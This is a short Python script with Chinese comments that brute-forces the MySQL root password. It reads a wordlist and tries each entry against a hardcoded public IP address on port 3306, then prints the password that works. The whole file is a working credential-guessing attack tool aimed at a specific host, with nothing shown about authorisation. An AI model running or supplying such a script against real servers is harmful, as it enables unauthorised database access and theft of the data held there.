# coding:utf-8
import pymysql#导入连接数据库的模块
import re

class PoJie:
    def __init__(self,path,ip,port):
        print("path:",path)
        self.file =open(path,"r",errors="ignore")#打开密码字典文件
        self.ip = ip 
        self.prot = port

    def ConnectMySql(self,word):#连接数据库的方法
        try:
            # db =pymysql.connect(host="39.102.58.201",user="root",passwd=strword) #连接数据库
            db = pymysql.connect(host=self.ip,port=self.prot,user='root',passwd=word)
            #pymysql.connect()方法的第一个参数是ip地址，本机可以用localhost代替
            #第二个参数是账户名，本文章为知道用户名情况破解密码
            #第三个是密码，
            db.close()#关闭数据库
            return True#连接成功返回True
        except:
            return False
 
    def PoJieChangShi(self):#读取密码字典的方法
        for line in self.file.readlines():
            passwd=line.strip()#读取密码字典的一行
            print("尝试：",passwd)
            if not passwd:#如果读到文件最后没有数据了，就跳出循环
                break
            if self.ConnectMySql(passwd):#把读到的一行密码传到连接数据库方法里面
                #如果返回了True说明破解成功
                print("密码正确 ip:",self.ip,",password:",passwd)#打印正确密码
                break#结束循环
            else :
                print("密码错误:",passwd)
        self.__del__()

    def __del__(self):#无论如何最终要执行的方法
        self.file.close()#关闭密码字典文件
        pass
    
    def trim(s):
        r = re.findall('[\S]+', s)
        return " ".join(r)


path=r"./script/wordlist.txt"#传入密码字典绝对文件路径
ip = '39.102.58.201'
port = 3306
start =PoJie(path,ip,port)#实例化对象
start.PoJieChangShi()#对象执行方法